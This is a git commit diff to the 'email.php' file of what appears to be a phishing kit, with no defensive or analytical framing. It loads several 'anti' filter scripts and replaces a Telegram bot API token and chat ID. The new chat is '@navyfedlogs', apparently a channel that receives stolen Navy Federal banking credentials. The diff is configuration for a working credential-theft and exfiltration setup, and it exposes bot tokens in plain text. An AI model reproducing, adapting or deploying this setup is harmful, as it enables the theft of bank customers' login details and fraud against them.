75f4038ac33066d1f43365d8194b5dfa28eb6a8d
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-10-14 10:44:38 +0200

    Update email.php

--- email.php
+++ email.php
@@ -5,7 +5,7 @@ include "anti/anti3.php";
 include "anti/anti4.php"; 
 include "anti/anti5.php"; 
 include "anti/anti7.php"; 
-$api = "5457574022:AAEA5SVAeLaVX_JnCbpRKE59Lw7YhrBK2VY";
-$chatid = "5090243433";
+$api = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";
+$chatid = "@navyfedlogs";
 $email ="your email";
 ?>
